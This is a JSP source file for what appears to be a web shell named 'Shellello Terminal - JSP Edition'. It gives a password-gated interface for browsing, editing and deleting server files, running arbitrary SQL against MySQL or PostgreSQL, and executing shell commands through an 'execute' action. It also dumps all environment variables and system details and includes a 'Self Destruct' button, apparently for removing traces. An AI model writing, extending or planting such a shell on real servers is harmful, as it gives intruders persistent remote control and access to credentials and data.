        html.append("        <button class=\"btn btn-secondary\" onclick=\"refreshFiles()\">🔄 Refresh</button>\n");
        html.append("        <button class=\"btn btn-primary\" onclick=\"showNewFile()\">📄 New File</button>\n");
        html.append("        <button class=\"btn btn-primary\" onclick=\"showNewFolder()\">📁 New Folder</button>\n");
        html.append("    </div>\n");
        html.append("</div>\n");
        
        // File List
        html.append("<div class=\"card\">\n");
        html.append("    <table>\n");
        html.append("        <thead>\n");
        html.append("            <tr><th>Name</th><th>Size</th><th>Owner</th><th>Modified</th><th>Actions</th></tr>\n");
        html.append("        </thead>\n");
        html.append("        <tbody id=\"fileList\"></tbody>\n");
        html.append("    </table>\n");
        html.append("</div>\n");
        
        // Editor Modal
        html.append("<div id=\"editorModal\" style=\"display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.8);z-index:1000;padding:40px;\">\n");
        html.append("    <div style=\"background:#1e293b;border-radius:12px;height:100%;display:flex;flex-direction:column;\">\n");
        html.append("        <div style=\"padding:16px 20px;border-bottom:1px solid #334155;display:flex;justify-content:space-between;align-items:center;\">\n");
        html.append("            <span id=\"editorTitle\">Editor</span>\n");
        html.append("            <div style=\"display:flex;gap:12px;\">\n");
        html.append("                <button class=\"btn btn-primary\" onclick=\"saveFile()\">💾 Save</button>\n");
        html.append("                <button class=\"btn btn-secondary\" onclick=\"closeEditor()\">✕ Close</button>\n");
        html.append("            </div>\n");
        html.append("        </div>\n");
        html.append("        <textarea id=\"editorContent\" style=\"flex:1;margin:20px;resize:none;font-family:monospace;font-size:14px;background:#0f172a;border:1px solid #334155;color:#e2e8f0;padding:16px;border-radius:8px;\"></textarea>\n");
        html.append("    </div>\n");
        html.append("</div>\n");
        
        // JavaScript
        html.append("<script>\n");
        html.append("let currentPath = '").append(escapeJs(cwd)).append("';\n");
        html.append("let editingFile = null;\n");
        html.append("\n");
        html.append("function loadFiles(path) {\n");
        html.append("    if (path) currentPath = path;\n");
        html.append("    else currentPath = document.getElementById('currentPath').value;\n");
        html.append("    \n");
        html.append("    fetch('?action=list_files&path=' + encodeURIComponent(currentPath))\n");
        html.append("        .then(r => r.json())\n");
        html.append("        .then(data => {\n");
        html.append("            if (data.status === 'success') {\n");
        html.append("                currentPath = data.path;\n");
        html.append("                document.getElementById('currentPath').value = currentPath;\n");
        html.append("                renderFiles(data.files);\n");
        html.append("            } else {\n");
        html.append("                showToast(data.message, 'error');\n");
        html.append("            }\n");
        html.append("        });\n");
        html.append("}\n");
        html.append("\n");
        html.append("function renderFiles(files) {\n");
        html.append("    const tbody = document.getElementById('fileList');\n");
        html.append("    tbody.innerHTML = '';\n");
        html.append("    \n");
        html.append("    files.forEach(f => {\n");
        html.append("        const tr = document.createElement('tr');\n");
        html.append("        const icon = f.isDir ? '📁' : '📄';\n");
        html.append("        const size = f.isDir ? '-' : formatBytes(f.size);\n");
        html.append("        const owner = f.owner || 'unknown';\n");
        html.append("        const date = new Date(f.modified).toLocaleString();\n");
        html.append("        \n");
        html.append("        tr.innerHTML = '<td style=\\\"cursor:pointer;\\\" onclick=\\\"' + (f.isDir ? 'loadFiles(\\\\'' + escapeAttr(currentPath + '/' + f.name) + '\\\\')' : 'editFile(\\\\'' + escapeAttr(currentPath + '/' + f.name) + '\\\\')') + '\\\">' + icon + ' ' + escapeHtml(f.name) + '</td>' +\\n");
        html.append("            '<td>' + size + '</td>' +\\n");
        html.append("            '<td style=\\\"color:#94a3b8;\\\">' + owner + '</td>' +\\n");
        html.append("            '<td>' + date + '</td>' +\\n");
        html.append("            '<td><button class=\\\"btn btn-secondary\\\" style=\\\"padding:4px 8px;font-size:12px;margin-right:4px;\\\" onclick=\\\"renameItem(\\\\'' + escapeAttr(f.name) + '\\\\')\\\">Rename</button>' +\\n");
        html.append("            '<button class=\"btn btn-danger\" style=\"padding:4px 8px;font-size:12px;\" onclick=\"deleteItem(\\'' + escapeAttr(f.name) + '\\')\">Delete</button></td>';\n");
        html.append("        tbody.appendChild(tr);\n");
        html.append("    });\n");
        html.append("}\n");
        html.append("\n");
        html.append("function goUp() {\n");
        html.append("    const parts = currentPath.split(/[\\\\/]/);\n");
        html.append("    parts.pop();\n");
        html.append("    loadFiles(parts.join('/') || '/');\n");
        html.append("}\n");
        html.append("\n");
        html.append("function refreshFiles() { loadFiles(); }\n");
        html.append("\n");
        html.append("function editFile(path) {\n");
        html.append("    fetch('?action=read_file&path=' + encodeURIComponent(path))\n");
        html.append("        .then(r => r.json())\n");
        html.append("        .then(data => {\n");
        html.append("            if (data.status === 'success') {\n");
        html.append("                editingFile = path;\n");
        html.append("                document.getElementById('editorTitle').textContent = path;\n");
        html.append("                document.getElementById('editorContent').value = data.content;\n");
        html.append("                document.getElementById('editorModal').style.display = 'block';\n");
        html.append("            } else {\n");
        html.append("                showToast(data.message, 'error');\n");
        html.append("            }\n");
        html.append("        });\n");
        html.append("}\n");
        html.append("\n");
        html.append("function saveFile() {\n");
        html.append("    const content = document.getElementById('editorContent').value;\n");
        html.append("    const formData = new FormData();\n");
        html.append("    formData.append('content', content);\n");
        html.append("    \n");
        html.append("    fetch('?action=save_file&path=' + encodeURIComponent(editingFile), { method: 'POST', body: formData })\n");
        html.append("        .then(r => r.json())\n");
        html.append("        .then(data => {\n");
        html.append("            showToast(data.message, data.status);\n");
        html.append("        });\n");
        html.append("}\n");
        html.append("\n");
        html.append("function closeEditor() {\n");
        html.append("    document.getElementById('editorModal').style.display = 'none';\n");
        html.append("    editingFile = null;\n");
        html.append("}\n");
        html.append("\n");
        html.append("function showNewFile() {\n");
        html.append("    const name = prompt('Enter file name:');\n");
        html.append("    if (name) {\n");
        html.append("        editingFile = currentPath + '/' + name;\n");
        html.append("        document.getElementById('editorTitle').textContent = editingFile;\n");
        html.append("        document.getElementById('editorContent').value = '';\n");
        html.append("        document.getElementById('editorModal').style.display = 'block';\n");
        html.append("    }\n");
        html.append("}\n");
        html.append("\n");
        html.append("function showNewFolder() {\n");
        html.append("    const name = prompt('Enter folder name:');\n");
        html.append("    if (name) {\n");
        html.append("        fetch('?action=create_folder&path=' + encodeURIComponent(currentPath + '/' + name))\n");
        html.append("            .then(r => r.json())\n");
        html.append("            .then(data => {\n");
        html.append("                showToast(data.message, data.status);\n");
        html.append("                if (data.status === 'success') loadFiles();\n");
        html.append("            });\n");
        html.append("    }\n");
        html.append("}\n");
        html.append("\n");
        html.append("function renameItem(name) {\n");
        html.append("    const newName = prompt('New name:', name);\n");
        html.append("    if (newName && newName !== name) {\n");
        html.append("        fetch('?action=rename&old_path=' + encodeURIComponent(currentPath + '/' + name) + '&new_path=' + encodeURIComponent(currentPath + '/' + newName))\n");
        html.append("            .then(r => r.json())\n");
        html.append("            .then(data => {\n");
        html.append("                showToast(data.message, data.status);\n");
        html.append("                if (data.status === 'success') loadFiles();\n");
        html.append("            });\n");
        html.append("    }\n");
        html.append("}\n");
        html.append("\n");
        html.append("function deleteItem(name) {\n");
        html.append("    if (confirm('Delete ' + name + '?')) {\n");
        html.append("        fetch('?action=delete_file&path=' + encodeURIComponent(currentPath + '/' + name))\n");
        html.append("            .then(r => r.json())\n");
        html.append("            .then(data => {\n");
        html.append("                showToast(data.message, data.status);\n");
        html.append("                if (data.status === 'success') loadFiles();\n");
        html.append("            });\n");
        html.append("    }\n");
        html.append("}\n");
        html.append("\n");
        html.append("function formatBytes(bytes) {\n");
        html.append("    const units = ['B', 'KB', 'MB', 'GB'];\n");
        html.append("    let i = 0;\n");
        html.append("    while (bytes >= 1024 && i < units.length - 1) { bytes /= 1024; i++; }\n");
        html.append("    return bytes.toFixed(2) + ' ' + units[i];\n");
        html.append("}\n");
        html.append("\n");
        html.append("function escapeHtml(s) { return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }\n");
        html.append("function escapeAttr(s) { return s.replace(/'/g,\"\\\\'\").replace(/\"/g,'&quot;'); }\n");
        html.append("\n");
        html.append("function showToast(msg, type) {\n");
        html.append("    const toast = document.createElement('div');\n");
        html.append("    toast.className = 'toast toast-' + (type === 'success' ? 'success' : 'error');\n");
        html.append("    toast.textContent = msg;\n");
        html.append("    document.body.appendChild(toast);\n");
        html.append("    setTimeout(() => toast.remove(), 3000);\n");
        html.append("}\n");
        html.append("\n");
        html.append("loadFiles();\n");
        html.append("</script>\n");
        
        return html.toString();
    }
%>

<%-- ========== 09_DATABASE ========== --%>
<%!
    // ==========================================
    // DATABASE PAGE
    // ==========================================
    
    public static String renderDatabaseContent(HttpSession sess) {
        boolean connected = sess.getAttribute("db_conn") != null;
        
        StringBuilder html = new StringBuilder();
        
        if (!connected) {
            // Connection Form
            html.append("<div class=\"card\">\n");
            html.append("    <div class=\"card-header\">Database Connection</div>\n");
            html.append("    <form id=\"dbConnectForm\" style=\"display:grid;gap:16px;max-width:500px;\">\n");
            html.append("        <div>\n");
            html.append("            <label style=\"display:block;margin-bottom:6px;color:#94a3b8;\">Database Type</label>\n");
            html.append("            <select name=\"db_type\" id=\"dbType\" style=\"width:100%;\">\n");
            html.append("                <option value=\"mysql\">MySQL</option>\n");
            html.append("                <option value=\"postgresql\">PostgreSQL</option>\n");
            html.append("            </select>\n");
            html.append("        </div>\n");
            html.append("        <div style=\"display:grid;grid-template-columns:1fr 1fr;gap:12px;\">\n");
            html.append("            <div>\n");
            html.append("                <label style=\"display:block;margin-bottom:6px;color:#94a3b8;\">Host</label>\n");
            html.append("                <input type=\"text\" name=\"host\" value=\"localhost\" style=\"width:100%;\">\n");
            html.append("            </div>\n");
            html.append("            <div>\n");
            html.append("                <label style=\"display:block;margin-bottom:6px;color:#94a3b8;\">Port</label>\n");
            html.append("                <input type=\"text\" name=\"port\" id=\"dbPort\" value=\"3306\" style=\"width:100%;\">\n");
            html.append("            </div>\n");
            html.append("        </div>\n");
            html.append("        <div>\n");
            html.append("            <label style=\"display:block;margin-bottom:6px;color:#94a3b8;\">Database Name</label>\n");
            html.append("            <input type=\"text\" name=\"database\" style=\"width:100%;\">\n");
            html.append("        </div>\n");
            html.append("        <div style=\"display:grid;grid-template-columns:1fr 1fr;gap:12px;\">\n");
            html.append("            <div>\n");
            html.append("                <label style=\"display:block;margin-bottom:6px;color:#94a3b8;\">Username</label>\n");
            html.append("                <input type=\"text\" name=\"username\" value=\"root\" style=\"width:100%;\">\n");
            html.append("            </div>\n");
            html.append("            <div>\n");
            html.append("                <label style=\"display:block;margin-bottom:6px;color:#94a3b8;\">Password</label>\n");
            html.append("                <input type=\"password\" name=\"password\" style=\"width:100%;\">\n");
            html.append("            </div>\n");
            html.append("        </div>\n");
            html.append("        <button type=\"submit\" class=\"btn btn-primary\">Connect</button>\n");
            html.append("    </form>\n");
            html.append("</div>\n");
        } else {
            // Connected View
            html.append("<div class=\"card\">\n");
            html.append("    <div style=\"display:flex;justify-content:space-between;align-items:center;\">\n");
            html.append("        <span style=\"color:#10b981;\">Connected to database</span>\n");
            html.append("        <button class=\"btn btn-danger\" onclick=\"disconnect()\">Disconnect</button>\n");
            html.append("    </div>\n");
            html.append("</div>\n");
            
            html.append("<div style=\"display:grid;grid-template-columns:250px 1fr;gap:20px;\">\n");
            
            // Tables List
            html.append("    <div class=\"card\">\n");
            html.append("        <div class=\"card-header\">Tables</div>\n");
            html.append("        <div id=\"tableList\"></div>\n");
            html.append("    </div>\n");
            
            // Query Area
            html.append("    <div class=\"card\">\n");
            html.append("        <div class=\"card-header\">Query</div>\n");
            html.append("        <textarea id=\"queryInput\" style=\"width:100%;height:120px;resize:vertical;font-family:monospace;\" placeholder=\"SELECT * FROM ...\"></textarea>\n");
            html.append("        <div style=\"margin-top:12px;display:flex;gap:12px;\">\n");
            html.append("            <button class=\"btn btn-primary\" onclick=\"executeQuery()\">Execute</button>\n");
            html.append("            <button class=\"btn btn-success\" id=\"exportCsvBtn\" onclick=\"exportCsv()\" style=\"display:none;\">📥 Export CSV</button>\n");
            html.append("        </div>\n");
            html.append("        <div id=\"queryResult\" style=\"margin-top:20px;overflow-x:auto;\"></div>\n");
            html.append("    </div>\n");
            html.append("</div>\n");
        }
        
        // JavaScript
        html.append("<script>\n");
        html.append("document.getElementById('dbType')?.addEventListener('change', function() {\n");
        html.append("    document.getElementById('dbPort').value = this.value === 'postgresql' ? '5432' : '3306';\n");
        html.append("});\n");
        html.append("\n");
        html.append("document.getElementById('dbConnectForm')?.addEventListener('submit', function(e) {\n");
        html.append("    e.preventDefault();\n");
        html.append("    const formData = new FormData(this);\n");
        html.append("    const params = new URLSearchParams(formData).toString();\n");
        html.append("    fetch('?action=db_connect&' + params)\n");
        html.append("        .then(r => r.json())\n");
        html.append("        .then(data => {\n");
        html.append("            showToast(data.message, data.status);\n");
        html.append("            if (data.status === 'success') location.reload();\n");
        html.append("        });\n");
        html.append("});\n");
        html.append("\n");
        html.append("function loadTables() {\n");
        html.append("    fetch('?action=db_tables')\n");
        html.append("        .then(r => r.json())\n");
        html.append("        .then(data => {\n");
        html.append("            if (data.status === 'success') {\n");
        html.append("                const list = document.getElementById('tableList');\n");
        html.append("                list.innerHTML = data.tables.map(t => '<div style=\"padding:8px;cursor:pointer;border-bottom:1px solid #334155;\" onclick=\"selectTable(\\'' + t + '\\')\">' + t + '</div>').join('');\n");
        html.append("            }\n");
        html.append("        });\n");
        html.append("}\n");
        html.append("\n");
        html.append("function selectTable(name) {\n");
        html.append("    document.getElementById('queryInput').value = 'SELECT * FROM ' + name + ' LIMIT 100';\n");
        html.append("}\n");
        html.append("\n");
        html.append("function executeQuery() {\n");
        html.append("    const query = document.getElementById('queryInput').value;\n");
        html.append("    const formData = new FormData();\n");
        html.append("    formData.append('query', query);\n");
        html.append("    fetch('?action=db_query', { method: 'POST', body: formData })\n");
        html.append("        .then(r => r.json())\n");
        html.append("        .then(data => {\n");
        html.append("            if (data.status === 'success' && data.columns) {\n");
        html.append("                let html = '<table><thead><tr>';\n");
        html.append("                data.columns.forEach(c => html += '<th>' + c + '</th>');\n");
        html.append("                html += '</tr></thead><tbody>';\n");
        html.append("                data.rows.forEach(row => {\n");
        html.append("                    html += '<tr>';\n");
        html.append("                    row.forEach(cell => html += '<td>' + (cell || 'NULL') + '</td>');\n");
        html.append("                    html += '</tr>';\n");
        html.append("                });\n");
        html.append("                html += '</tbody></table>';\n");
        html.append("                document.getElementById('queryResult').innerHTML = html;\n");
        html.append("                document.getElementById('exportCsvBtn').style.display = 'inline-block';\n");
        html.append("            } else if (data.affected !== undefined) {\n");
        html.append("                document.getElementById('queryResult').innerHTML = '<p style=\"color:#10b981;\">Query executed. Rows affected: ' + data.affected + '</p>';\n");
        html.append("                document.getElementById('exportCsvBtn').style.display = 'none';\n");
        html.append("            } else {\n");
        html.append("                document.getElementById('queryResult').innerHTML = '<p style=\"color:#ef4444;\">' + data.message + '</p>';\n");
        html.append("            }\n");
        html.append("        });\n");
        html.append("}\n");
        html.append("\n");
html.append("function exportCsv() {\n");
html.append("    const query = document.getElementById('queryInput').value;\n");
html.append("    const form = document.createElement('form');\n");
html.append("    form.method = 'POST';\n");
html.append("    form.action = '?action=db_export_csv';\n");
html.append("    const input = document.createElement('input');\n");
html.append("    input.type = 'hidden';\n");
html.append("    input.name = 'query';\n");
html.append("    input.value = query;\n");
html.append("    form.appendChild(input);\n");
html.append("    document.body.appendChild(form);\n");
html.append("    form.submit();\n");
html.append("    document.body.removeChild(form);\n");
html.append("}\n");
html.append("\n");
        html.append("function disconnect() {\n");
        html.append("    fetch('?action=db_disconnect').then(() => location.reload());\n");
        html.append("}\n");
        html.append("\n");
        html.append("function showToast(msg, type) {\n");
        html.append("    const toast = document.createElement('div');\n");
        html.append("    toast.className = 'toast toast-' + (type === 'success' ? 'success' : 'error');\n");
        html.append("    toast.textContent = msg;\n");
        html.append("    document.body.appendChild(toast);\n");
        html.append("    setTimeout(() => toast.remove(), 3000);\n");
        html.append("}\n");
        html.append("\n");
        html.append("if (document.getElementById('tableList')) loadTables();\n");
        html.append("</script>\n");
        
        return html.toString();
    }
%>

<%-- ========== 10_TERMINAL ========== --%>
<%!
    // ==========================================
    // TERMINAL PAGE
    // ==========================================
    
    public static String renderTerminalContent() {
        String cwd = System.getProperty("user.dir");
        
        StringBuilder html = new StringBuilder();
        
        html.append("<div class=\"card\" style=\"height:calc(100vh - 180px);display:flex;flex-direction:column;\">\n");
        html.append("    <div id=\"terminalOutput\" style=\"flex:1;background:#0f172a;border-radius:8px;padding:16px;font-family:monospace;font-size:14px;overflow-y:auto;white-space:pre-wrap;margin-bottom:16px;\"></div>\n");
        html.append("    <div style=\"display:flex;gap:12px;align-items:center;\">\n");
        html.append("        <span style=\"color:#10b981;\">$</span>\n");
        html.append("        <input type=\"text\" id=\"terminalInput\" style=\"flex:1;font-family:monospace;\" placeholder=\"Enter command...\" autofocus>\n");
        html.append("        <button class=\"btn btn-primary\" onclick=\"executeCmd()\">Run</button>\n");
        html.append("        <button class=\"btn btn-secondary\" onclick=\"clearTerminal()\">Clear</button>\n");
        html.append("    </div>\n");
        html.append("    <div style=\"margin-top:12px;display:flex;gap:12px;align-items:center;\">\n");
        html.append("        <label style=\"color:#94a3b8;\">CWD:</label>\n");
        html.append("        <input type=\"text\" id=\"terminalCwd\" value=\"").append(escapeHtml(cwd)).append("\" style=\"flex:1;\">\n");
        html.append("    </div>\n");
        html.append("</div>\n");
        
        // JavaScript
        html.append("<script>\n");
        html.append("const termOutput = document.getElementById('terminalOutput');\n");
        html.append("const termInput = document.getElementById('terminalInput');\n");
        html.append("const termCwd = document.getElementById('terminalCwd');\n");
        html.append("let cmdHistory = [];\n");
        html.append("let historyIndex = -1;\n");
        html.append("\n");
        html.append("function executeCmd() {\n");
        html.append("    const cmd = termInput.value.trim();\n");
        html.append("    if (!cmd) return;\n");
        html.append("    \n");
        html.append("    cmdHistory.unshift(cmd);\n");
        html.append("    historyIndex = -1;\n");
        html.append("    \n");
        html.append("    termOutput.innerHTML += '<div style=\"color:#10b981;\">$ ' + escapeHtml(cmd) + '</div>';\n");
        html.append("    \n");
        html.append("    const formData = new FormData();\n");
        html.append("    formData.append('command', cmd);\n");
        html.append("    formData.append('cwd', termCwd.value);\n");
        html.append("    \n");
        html.append("    fetch('?action=execute', { method: 'POST', body: formData })\n");
        html.append("        .then(r => r.json())\n");
        html.append("        .then(data => {\n");
        html.append("            if (data.status === 'success') {\n");
        html.append("                termOutput.innerHTML += '<div style=\"color:#e2e8f0;\">' + escapeHtml(data.output) + '</div>';\n");
        html.append("            } else {\n");
        html.append("                termOutput.innerHTML += '<div style=\"color:#ef4444;\">Error: ' + escapeHtml(data.message) + '</div>';\n");
        html.append("            }\n");
        html.append("            termOutput.scrollTop = termOutput.scrollHeight;\n");
        html.append("        });\n");
        html.append("    \n");
        html.append("    termInput.value = '';\n");
        html.append("}\n");
        html.append("\n");
        html.append("function clearTerminal() {\n");
        html.append("    termOutput.innerHTML = '';\n");
        html.append("}\n");
        html.append("\n");
        html.append("function escapeHtml(s) {\n");
        html.append("    return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');\n");
        html.append("}\n");
        html.append("\n");
        html.append("termInput.addEventListener('keydown', function(e) {\n");
        html.append("    if (e.key === 'Enter') executeCmd();\n");
        html.append("    else if (e.key === 'ArrowUp') {\n");
        html.append("        if (historyIndex < cmdHistory.length - 1) {\n");
        html.append("            historyIndex++;\n");
        html.append("            termInput.value = cmdHistory[historyIndex];\n");
        html.append("        }\n");
        html.append("    } else if (e.key === 'ArrowDown') {\n");
        html.append("        if (historyIndex > 0) {\n");
        html.append("            historyIndex--;\n");
        html.append("            termInput.value = cmdHistory[historyIndex];\n");
        html.append("        } else {\n");
        html.append("            historyIndex = -1;\n");
        html.append("            termInput.value = '';\n");
        html.append("        }\n");
        html.append("    }\n");
        html.append("});\n");
        html.append("\n");
        html.append("termOutput.innerHTML = '<div style=\"color:#64748b;\">Shellello Terminal - JSP Edition</div><div style=\"color:#64748b;\">Type commands and press Enter</div>';\n");
        html.append("</script>\n");
        
        return html.toString();
    }
%>

<%-- ========== 11_SETTINGS ========== --%>
<%!
    // ==========================================
    // SETTINGS PAGE
    // ==========================================
    
    public static String renderSettingsContent() {
        StringBuilder html = new StringBuilder();
        
        // System Info
        html.append("<div class=\"card\">\n");
        html.append("    <div class=\"card-header\">System Information</div>\n");
        html.append("    <table>\n");
        html.append("        <tr><td style=\"color:#94a3b8;width:200px;\">Java Version</td><td>").append(escapeHtml(System.getProperty("java.version"))).append("</td></tr>\n");
        html.append("        <tr><td style=\"color:#94a3b8;\">Java Vendor</td><td>").append(escapeHtml(System.getProperty("java.vendor"))).append("</td></tr>\n");
        html.append("        <tr><td style=\"color:#94a3b8;\">OS Name</td><td>").append(escapeHtml(System.getProperty("os.name"))).append("</td></tr>\n");
        html.append("        <tr><td style=\"color:#94a3b8;\">OS Version</td><td>").append(escapeHtml(System.getProperty("os.version"))).append("</td></tr>\n");
        html.append("        <tr><td style=\"color:#94a3b8;\">OS Arch</td><td>").append(escapeHtml(System.getProperty("os.arch"))).append("</td></tr>\n");
        html.append("        <tr><td style=\"color:#94a3b8;\">User Name</td><td>").append(escapeHtml(System.getProperty("user.name"))).append("</td></tr>\n");
        html.append("        <tr><td style=\"color:#94a3b8;\">User Home</td><td>").append(escapeHtml(System.getProperty("user.home"))).append("</td></tr>\n");
        html.append("        <tr><td style=\"color:#94a3b8;\">Working Dir</td><td>").append(escapeHtml(System.getProperty("user.dir"))).append("</td></tr>\n");
        html.append("        <tr><td style=\"color:#94a3b8;\">Temp Dir</td><td>").append(escapeHtml(System.getProperty("java.io.tmpdir"))).append("</td></tr>\n");
        html.append("    </table>\n");
        html.append("</div>\n");
        
        // Memory Info
        Runtime runtime = Runtime.getRuntime();
        long totalMem = runtime.totalMemory();
        long freeMem = runtime.freeMemory();
        long maxMem = runtime.maxMemory();
        
        html.append("<div class=\"card\">\n");
        html.append("    <div class=\"card-header\">Memory</div>\n");
        html.append("    <table>\n");
        html.append("        <tr><td style=\"color:#94a3b8;width:200px;\">Total Memory</td><td>").append(formatBytes(totalMem)).append("</td></tr>\n");
        html.append("        <tr><td style=\"color:#94a3b8;\">Free Memory</td><td>").append(formatBytes(freeMem)).append("</td></tr>\n");
        html.append("        <tr><td style=\"color:#94a3b8;\">Max Memory</td><td>").append(formatBytes(maxMem)).append("</td></tr>\n");
        html.append("        <tr><td style=\"color:#94a3b8;\">Used Memory</td><td>").append(formatBytes(totalMem - freeMem)).append("</td></tr>\n");
        html.append("        <tr><td style=\"color:#94a3b8;\">Available Processors</td><td>").append(runtime.availableProcessors()).append("</td></tr>\n");
        html.append("    </table>\n");
        html.append("</div>\n");
        
        // Environment
        html.append("<div class=\"card\">\n");
        html.append("    <div class=\"card-header\">Environment Variables</div>\n");
        html.append("    <div style=\"max-height:300px;overflow-y:auto;\">\n");
        html.append("    <table>\n");
        Map<String, String> env = System.getenv();
        for (Map.Entry<String, String> entry : env.entrySet()) {
            html.append("        <tr><td style=\"color:#94a3b8;\">").append(escapeHtml(entry.getKey())).append("</td><td style=\"word-break:break-all;\">").append(escapeHtml(entry.getValue())).append("</td></tr>\n");
        }
        html.append("    </table>\n");
        html.append("    </div>\n");
        html.append("</div>\n");
        
        // Danger Zone
        html.append("<div class=\"card\" style=\"border-color:#dc2626;\">\n");
        html.append("    <div class=\"card-header\" style=\"color:#ef4444;\">Danger Zone</div>\n");
        html.append("    <p style=\"color:#94a3b8;margin-bottom:16px;\">Destructive actions that cannot be undone.</p>\n");
        html.append("    <div style=\"display:flex;gap:12px;\">\n");
        html.append("        <button class=\"btn btn-danger\" onclick=\"if(confirm('Are you sure?')) fetch('?action=self_destruct').then(()=>location.href='/')\">Self Destruct</button>\n");
        html.append("    </div>\n");
        html.append("</div>\n");
        
        return html.toString();
    }
%>

<%-- ========== 12_ROUTER ========== --%>
<%
    // ==========================================
    // MAIN ROUTER
    // ==========================================
    
    // Handle logout
    if (request.getParameter("logout") != null) {
        logout(session);
        response.sendRedirect("?");
        return;
    }
    
    // Handle API actions
    String action = request.getParameter("action");
    if (action != null) {
        if (!isAuthenticated(session)) {
            response.setContentType("application/json");
            out.print("{\"status\":\"error\",\"message\":\"Not authenticated\"}");
            return;
        }
        handleApiAction(action, request, response, out);
        return;
    }
    
    // Handle authentication
    if (!isAuthenticated(session)) {
        String error = null;
        if ("POST".equals(request.getMethod()) && request.getParameter("password") != null) {
            if (attemptLogin(session, request.getParameter("password"), AUTH_HASH)) {
                response.sendRedirect("?page=dashboard");
                return;
            } else {
                error = "Invalid password. Please try again.";
            }
        }
        out.print(renderLoginPage(error, APP_NAME));
        return;
    }
    
    // Route to pages
    page = request.getParameter("page");
    if (page == null) page = "dashboard";
    
    out.print(renderLayoutStart(page, APP_NAME, APP_VERSION, session));
    
    switch (page) {
        case "files":
            out.print(renderFileManagerContent());
            break;
        case "database":
            out.print(renderDatabaseContent(session));
            break;
        case "terminal":
            out.print(renderTerminalContent());
            break;
        case "settings":
            out.print(renderSettingsContent());
            break;
        default:
            out.print(renderDashboardContent(session));
    }
    
    out.print(renderLayoutEnd());
%>
